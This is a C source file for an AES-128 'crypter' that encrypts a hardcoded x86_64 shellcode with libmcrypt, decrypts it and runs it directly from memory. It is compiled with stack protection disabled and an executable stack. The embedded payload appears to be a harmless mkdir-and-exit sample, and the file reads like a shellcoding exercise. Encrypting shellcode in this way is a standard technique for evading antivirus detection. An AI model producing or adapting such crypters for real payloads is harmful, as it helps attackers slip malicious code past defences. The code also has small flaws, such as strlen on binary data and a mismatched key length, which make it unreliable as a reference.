// Author: xephoxx
// Description: AES-128 Crypter for the shellcodes

// How to compile ? -> $ gcc AES-Crypter.c -o test -lmcrypt -fno-stack-protector -z execstack

#include <mcrypt.h>
#include <string.h>
#include <stdio.h>

// Some variables to prepare encryption
int i;
char *algo = "rijndael-128";
char *my_KEY = "_65a8@I;g!8]@*&!#~";
char *my_IV = "ABCDEFGHIJKLMNOP";
char block_buffer[32];

// Our shellcode
const char shellcode[] = \
"\xeb\x13\x48\x31\xc0\x5f\x66\xbe\xff\x01"
"\x04\x53\x0f\x05\x48\x31\xc0\x04\x3c\x0f"
"\x05\xe8\xe8\xff\xff\xff\x72\x61\x62\x62\x69\x74";

// lenght of shellcode
int shellcode_lenght = strlen(shellcode);

// Declared functions
int encrypt(void *block_buffer, int block_size_buffer, char *my_IV, char *my_KEY);
int decrypt(void *block_buffer, int block_size_buffer, char *my_IV, char *my_KEY);

// Main function here
int main(){

    // Print original shellcode
    printf("[*] Original Shellcode : \n");
    
    for (i=0; i<shellcode_lenght; i++){
        printf("\\x%02x", shellcode[i]);
    }

    // Copy shellcode in memory on 32 byte buffer
    strncpy(block_buffer, shellcode, 32);

    // Encryption
    encrypt(block_buffer, 32, my_IV, my_KEY);

    // Print encrypted shellcode
    printf("\n[*] Encrypted Shellcode below : \n");
    for (i=0; i<32; i++){
        printf("\\x%02x", block_buffer[i]);
    }

    // Decryption
    decrypt(block_buffer, 32, my_IV, my_KEY);

    // Print decrypted shellcode
    printf("\n[*] Decrypted Shellcode below : \n");
    for (i=0; i<shellcode_lenght; i++){
        printf("\\x%02x", block_buffer[i]);
    }

    printf("\n\n[*] Shellcode length : %d\n", strlen(block_buffer));
    int (*ret)() = (int(*)())block_buffer;
    ret();

    return 0;

}

int encrypt(void *block_buffer, int block_size_buffer, char *my_IV, char *my_KEY){

    // We choose the algorithm
    MCRYPT mcrypt_object = mcrypt_module_open(algo, NULL, MCRYPT_CFB, NULL);
    mcrypt_generic_init(mcrypt_object, my_KEY, 32, my_IV);

    printf("\n\n[*] Shellcode encryption done ! \n");

    mcrypt_generic(mcrypt_object, block_buffer, block_size_buffer);

    return 0;

}

int decrypt(void *block_buffer, int block_size_buffer, char *my_IV, char *my_KEY){
    
    // We choose the algorithm
    MCRYPT mcrypt_object = mcrypt_module_open(algo, NULL, MCRYPT_CFB, NULL);
    mcrypt_generic_init(mcrypt_object, my_KEY, 32, my_IV);

    printf("\n\n[*] Shellcode decryption done ! \n");

    mdecrypt_generic(mcrypt_object, block_buffer, block_size_buffer);

    mcrypt_generic_deinit(mcrypt_object);
    mcrypt_module_close(mcrypt_object);

    return 0;

}
